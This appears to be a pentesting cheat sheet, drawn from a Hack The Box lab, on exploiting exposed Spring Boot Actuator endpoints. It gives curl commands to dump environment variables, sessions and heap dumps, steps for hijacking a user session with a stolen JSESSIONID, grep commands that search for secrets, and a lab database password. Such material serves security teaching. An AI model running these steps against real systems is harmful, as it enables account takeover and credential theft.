# Spring Boot Actuators

Spring Boot Actuators are endpoints that expose operational information about running Spring applications. When misconfigured (exposed without authentication), they can leak sensitive data and enable various attacks.

## Detection

### Whitelabel Error Page

When browsing to a non-existent endpoint, Spring Boot displays a generic error:

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Thu Jan 22 02:23:23 UTC 2026
There was an unexpected error (type=Not Found, status=404).
```

### Using Nuclei

```bash
nuclei -u http://target.htb/ -rl 75 -c 8 -as

# Output showing Spring Boot detection:
[spring-detect] [http] [info] http://target.htb/error
[springboot-actuator:available-endpoints] [http] [info] http://target.htb/actuator ["health-path","mappings","self","sessions","beans","env","env-toMatch","health"]
[springboot-beans] [http] [low] http://target.htb/actuator/beans
[springboot-env] [http] [low] http://target.htb/actuator/env
[springboot-mappings] [http] [low] http://target.htb/actuator/mappings
```

---

## Common Actuator Endpoints

| Endpoint | Description | Risk |
|----------|-------------|------|
| `/actuator` | Lists all available endpoints | Info |
| `/actuator/env` | Environment variables, may contain credentials | High |
| `/actuator/sessions` | Active sessions with session IDs | Critical |
| `/actuator/beans` | All Spring beans in the application | Medium |
| `/actuator/mappings` | All @RequestMapping paths | Medium |
| `/actuator/health` | Application health status | Low |
| `/actuator/heapdump` | JVM heap dump (may contain secrets) | Critical |
| `/actuator/logfile` | Application log file | Medium |
| `/actuator/trace` or `/actuator/httptrace` | HTTP request traces | High |
| `/actuator/shutdown` | Shuts down the application (POST) | Critical |

---

## Enumeration

### List Available Endpoints

```bash
curl -s http://target.htb/actuator | jq .
```

Example output:

```json
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```

### Check for Sensitive Endpoints

```bash
# Environment variables (may contain DB passwords, API keys)
curl -s http://target.htb/actuator/env | jq .

# Application routes - useful for finding hidden endpoints
curl -s http://target.htb/actuator/mappings | jq .

# Active user sessions - goldmine for session hijacking!
curl -s http://target.htb/actuator/sessions | jq .

# Heap dump - can be analyzed for secrets
curl -s http://target.htb/actuator/heapdump -o heapdump.bin
```

---

## Session Hijacking via /actuator/sessions

This is one of the most impactful findings. The sessions endpoint exposes active session IDs and usernames.

### Get Active Sessions

```bash
curl -s http://target.htb/actuator/sessions | jq .
```

Example output:

```json
{
  "91E210D5C481E1BEE0D25667612DCF5F": "UNAUTHORIZED",
  "1E7D6BD497E536CF9FA3DFF861DA4350": "kanderson",
  "DDC687C0B1996D7E8F289239EED8A7CA": "kanderson"
}
```

### Hijack the Session

1. Copy a valid session ID (e.g., `DDC687C0B1996D7E8F289239EED8A7CA`)
2. Open browser DevTools > Application > Cookies
3. Find the session cookie (often `JSESSIONID` for Spring Boot)
4. Replace the value with the stolen session ID
5. Refresh the page - you're now authenticated as that user!

Alternatively, use curl:

```bash
curl -s http://target.htb/admin -H "Cookie: JSESSIONID=DDC687C0B1996D7E8F289239EED8A7CA"
```

---

## Finding Hidden Endpoints via /actuator/mappings

The mappings endpoint reveals all application routes, including those not publicly linked.

```bash
curl -s http://target.htb/actuator/mappings | jq '.contexts[].mappings.dispatcherServlets[][].predicate' 2>/dev/null
```

Example findings:

```json
{
  "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
  "predicate": "{POST [/executessh]}",
  "details": {
    "handlerMethod": {
      "className": "htb.cloudhosting.compliance.ComplianceService",
      "name": "executeOverSsh",
      "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"
    }
  }
}
```

This reveals a `/executessh` endpoint that accepts POST requests - potentially vulnerable to command injection!

---

## Extracting Credentials from /actuator/env

Environment variables may contain database passwords, API keys, etc.:

```bash
curl -s http://target.htb/actuator/env | jq .
```

Look for properties like:

- `spring.datasource.password`
- `spring.datasource.username`
- `spring.datasource.url`
- Any property with "password", "secret", "key", "token"

Note: Sensitive values are often masked with `******`, but can sometimes be recovered from heapdump.

---

## Heapdump Analysis

Download and analyze for credentials:

```bash
# Download heapdump
curl -s http://target.htb/actuator/heapdump -o heapdump.bin

# Use Eclipse Memory Analyzer (MAT) or strings
strings heapdump.bin | grep -i password
strings heapdump.bin | grep -i secret
strings heapdump.bin | grep -i jdbc

# Or use heapdump_tool
# https://github.com/wyzxxz/heapdump_tool
java -jar heapdump_tool.jar heapdump.bin
```

---

## Extracting Credentials from JAR Files

If you gain shell access to a Spring Boot server, check for embedded credentials:

```bash
# Find the JAR
find / -name "*.jar" 2>/dev/null

# Extract and search for credentials
unzip -d extracted/ application.jar
cat extracted/BOOT-INF/classes/application.properties
```

Example `application.properties`:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

---

## References

- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html
- https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
